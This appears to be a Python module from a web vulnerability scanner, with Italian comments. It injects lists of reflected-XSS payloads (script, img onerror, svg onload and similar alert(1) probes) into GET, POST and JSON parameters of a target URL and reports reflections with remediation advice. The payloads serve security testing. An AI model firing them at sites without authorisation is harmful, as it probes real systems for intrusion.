import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Payload XSS standard
PAYLOADS_BASIC = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'\"><img src=x onerror=alert(1)>",
]

# Payload XSS aggressivi
PAYLOADS_AGGRESSIVE = [
    "<svg/onload=alert(1)>",
    "<img src=x onerror=alert(1)>",
    "<body onload=alert(1)>",
    "';alert(1);//",
    "\"><svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
]


def inject_get_param(url, param, payload):
    parsed = urlparse(url)
    qs = parse_qs(parsed.query)

    if param not in qs:
        return None

    qs[param] = [payload]
    new_query = urlencode(qs, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def test_reflection(body, payload, param, vector):
    results = []

    if payload in body:
        results.append({
            "module": "xss",
            "severity": "high",
            "title": f"Possibile XSS riflesso ({vector})",
            "description": f"Il parametro '{param}' sembra vulnerabile via {vector}.",
            "evidence": f"Payload riflesso: {payload}",
            "remediation": "Sanifica l'output e usa escaping lato server."
        })

    elif "<script>" in body.lower():
        results.append({
            "module": "xss",
            "severity": "medium",
            "title": f"Possibile esecuzione script lato client ({vector})",
            "description": f"Risposta contenente <script> dopo input controllato.",
            "evidence": "Presenza di <script> nella risposta.",
            "remediation": "Valida e filtra l'input, usa Content-Security-Policy."
        })

    return results


def run(target, aggressive=False):
    results = []

    # Scegli payload
    payloads = PAYLOADS_BASIC + PAYLOADS_AGGRESSIVE if aggressive else PAYLOADS_BASIC

    parsed = urlparse(target)
    params = parse_qs(parsed.query)

    has_get_params = bool(params)
    generic_param = "test"

    # -------------------------
    #       XSS GET
    # -------------------------
    if has_get_params:
        for param in params:
            timeout_triggered = False

            for payload in payloads:
                if timeout_triggered:
                    break

                test_url = inject_get_param(target, param, payload)
                if not test_url:
                    continue

                try:
                    r = requests.get(test_url, timeout=5)
                    body = r.text
                    findings = test_reflection(body, payload, param, "GET")
                    if findings:
                        results.extend(findings)
                        break

                except requests.exceptions.Timeout:
                    timeout_triggered = True
                    results.append({
                        "module": "xss",
                        "severity": "low",
                        "title": "Timeout durante test XSS (GET)",
                        "description": f"Il server non ha risposto in tempo per '{param}'.",
                        "evidence": "Timeout dopo 5 secondi",
                        "remediation": "Il server potrebbe essere lento o filtrare richieste automatiche."
                    })

                except Exception as e:
                    results.append({
                        "module": "xss",
                        "severity": "low",
                        "title": "Errore durante il test XSS (GET)",
                        "description": str(e),
                        "evidence": None,
                        "remediation": None
                    })

    # -------------------------
    #       XSS POST
    # -------------------------
    post_params = list(params.keys()) if has_get_params else [generic_param]

    for param in post_params:
        timeout_triggered = False

        for payload in payloads:
            if timeout_triggered:
                break

            data = {param: payload}

            try:
                r = requests.post(target, data=data, timeout=5)
                body = r.text
                findings = test_reflection(body, payload, param, "POST")
                if findings:
                    results.extend(findings)
                    break

            except requests.exceptions.Timeout:
                timeout_triggered = True
                results.append({
                    "module": "xss",
                    "severity": "low",
                    "title": "Timeout durante test XSS (POST)",
                    "description": f"Il server non ha risposto in tempo per '{param}'.",
                    "evidence": "Timeout dopo 5 secondi",
                    "remediation": "Il server potrebbe essere lento o filtrare richieste automatiche."
                })

            except Exception as e:
                results.append({
                    "module": "xss",
                    "severity": "low",
                    "title": "Errore durante il test XSS (POST)",
                    "description": str(e),
                    "evidence": None,
                    "remediation": None
                })

    # -------------------------
    #       XSS JSON
    # -------------------------
    json_params = list(params.keys()) if has_get_params else [generic_param]

    for param in json_params:
        timeout_triggered = False

        for payload in payloads:
            if timeout_triggered:
                break

            json_data = {param: payload}

            try:
                r = requests.post(target, json=json_data, timeout=5)
                body = r.text
                findings = test_reflection(body, payload, param, "JSON")
                if findings:
                    results.extend(findings)
                    break

            except requests.exceptions.Timeout:
                timeout_triggered = True
                results.append({
                    "module": "xss",
                    "severity": "low",
                    "title": "Timeout durante test XSS (JSON)",
                    "description": f"Il server non ha risposto in tempo per '{param}'.",
                    "evidence": "Timeout dopo 5 secondi",
                    "remediation": "Il server potrebbe essere lento o filtrare richieste automatiche."
                })

            except Exception as e:
                results.append({
                    "module": "xss",
                    "severity": "low",
                    "title": "Errore durante il test XSS (JSON)",
                    "description": str(e),
                    "evidence": None,
                    "remediation": None
                })

    return results
